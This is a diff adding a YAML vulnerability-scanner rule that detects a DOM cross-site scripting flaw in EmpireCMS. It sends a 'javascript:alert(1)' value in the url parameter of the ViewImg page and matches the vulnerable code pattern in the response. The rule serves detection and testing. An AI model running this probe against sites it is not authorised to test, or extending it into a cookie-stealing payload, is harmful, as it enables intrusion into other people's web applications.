@@ -1,0 +1,9 @@
+name: EmpireCMS DOM Cross Site-Scripting
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/e/ViewImg/index.html?url=javascript:alert(1)"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"+Request("url")+"') && response.body.bcontains(b'if(Request("url")!=0)')
+expression: r0()
